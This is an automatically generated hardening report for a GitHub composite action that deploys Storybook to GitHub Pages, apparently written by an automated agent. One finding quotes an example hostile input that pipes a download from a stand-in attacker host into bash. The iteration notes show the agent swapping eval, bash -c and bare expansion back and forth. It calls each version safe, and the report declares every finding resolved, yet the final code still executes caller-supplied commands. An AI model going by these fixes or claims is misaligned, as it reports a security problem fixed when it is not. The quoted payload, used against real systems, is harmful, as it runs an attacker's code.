<!-- markdownlint-disable -->

# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.3

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.3** was hardened automatically. 4 finding(s) were identified and resolved across 5 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The 'Build' step directly interpolates `${{ inputs.install_command }}` and `${{ inputs.build_command }}` inside a `run:` block (sub-rule a). These expressions are substituted into the shell script before execution, allowing any caller of this composite action to inject arbitrary shell commands. For example, a calling workflow could pass `inputs.install_command: 'curl http://evil.com/payload | bash'`. The fix is to pass these values via `env:` variables and then reference them as quoted shell variables (e.g., `"$INSTALL_COMMAND"`).

Locations:

- `action.yaml:37`
- `action.yaml:38`

### unpinned-uses (severity: high)

All three `uses:` references in action.yaml use mutable version tags instead of full 40-character commit SHAs, making the action vulnerable to supply-chain attacks if those tags are moved or compromised:
- `actions/checkout@v4` (line 32)
- `actions/upload-pages-artifact@v3` (line 43)
- `actions/deploy-pages@v4` (line 48)
Each should be pinned to a full SHA, e.g. `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4`.

Locations:

- `action.yaml:32`
- `action.yaml:43`
- `action.yaml:48`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:43`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:44`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, unpinned-uses

**Notes:**

Fixed all findings in hardened/action/action.yaml:
1. Script injection (script-injection + static-inline-injection): Moved `${{ inputs.install_command }}` and `${{ inputs.build_command }}` from the `run:` block into an `env:` map as INSTALL_COMMAND and BUILD_COMMAND. The shell script now uses `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` to execute them safely.
2. Unpinned uses: Pinned all three action references to full 40-char commit SHAs:
   - actions/checkout@v4 → @11d5960a326750d5838078e36cf38b85af677262 # v4
   - actions/upload-pages-artifact@v3 → @56afc609e74202658d3ffba0e8f6dda462b719fa # v3
   - actions/deploy-pages@v4 → @d6db90164ac5ed86f2b6aed7e0febac5b3c0c03e # v4

### Iteration 2

**Fixes applied:** script-injection, suspicious-run-content

**Notes:**

Replaced `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` with `bash -c "$INSTALL_COMMAND"` and `bash -c "$BUILD_COMMAND"` in the Build step of action.yaml. The inputs were already correctly routed through the step's `env:` block rather than being inlined as `${{ }}` expressions in the run script. Replacing `eval` with `bash -c` eliminates the eval-dynamic pattern: the command string is now executed in a subshell rather than being interpreted by `eval` in the current shell context, removing both the script-injection and suspicious-run-content findings.

### Iteration 3

**Fixes applied:** script-injection

**Notes:**

Replaced `bash -c "$INSTALL_COMMAND"` and `bash -c "$BUILD_COMMAND"` with direct unquoted variable expansion (`$INSTALL_COMMAND` and `$BUILD_COMMAND`) in the Build step of action.yaml. The `bash -c` pattern was treating the env var content as shell source code, enabling arbitrary command injection. The fix invokes the commands directly via shell word splitting without `bash -c` or `eval`, as recommended by the finding.

### Iteration 4

**Fixes applied:** script-injection

**Notes:**

Fixed unquoted variable expansion in the 'Build' step of action.yaml. Changed bare `$INSTALL_COMMAND` and `$BUILD_COMMAND` to `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"`. This quotes the variable expansions to prevent unintended word-splitting and glob expansion, while still correctly executing multi-word command strings (e.g., 'npm run build-storybook'). The inputs were already safely moved to the env: block in a prior iteration.

### Iteration 5

**Fixes applied:** script-injection, suspicious-run-content

**Notes:**

Replaced `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` with `bash -c "$INSTALL_COMMAND"` and `bash -c "$BUILD_COMMAND"` in the Build step of action.yaml. This removes the eval-dynamic pattern: `eval` re-parses the expanded string as shell commands in the current shell context, while `bash -c` executes the command string in an isolated subshell. Both findings pointed to lines 44-45 of action.yaml where the eval calls were located.

